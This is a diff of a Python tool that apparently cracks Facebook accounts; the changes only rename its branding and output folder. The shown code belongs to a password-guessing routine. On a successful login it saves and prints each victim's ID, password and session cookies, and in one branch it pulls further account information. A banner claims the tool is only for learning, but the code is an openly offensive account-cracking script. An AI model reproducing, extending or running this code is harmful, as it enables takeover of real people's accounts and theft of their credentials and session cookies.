@@ -139,7 +139,7 @@ def banner():
 ⠀⠀⠀⠀⠀⠀⠀⠀
   {m}•{k}•{h}•{sir} THIS TOOL IS ONLY FOR LEARNING PURPOSE {x}{m}•{k}•{h}•{x}
 
-    \t{asu}    {m}•{k}•{h}•{sir} RECODE : ALIYAKHAN  {x}{m}•{k}•{h}•{x}''')
+    \t{asu}    {m}•{k}•{h}•{sir} RECODE : ALIYAKHAN1  {x}{m}•{k}•{h}•{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -535,17 +535,17 @@ def crackfreefb(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/ALIYAKHAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/ALIYAKHAN1-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'ALIYA-OK😘[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='ALIYAKHAN-XD OK'))
+					cetak(nel(statusok1, title='ALIYAKHAN1-XD OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/ALIYAKHAN-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/ALIYAKHAN1-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -567,7 +567,7 @@ def crackfreefb(idf,pwv):
 					print('\n')
 					statusok = f'[bold green]ALIYA-OK😘[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]ALIYAKHAN-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]ALIYAKHAN1-XD OK[/bold green]'))
 					ok+=1
 					break
 
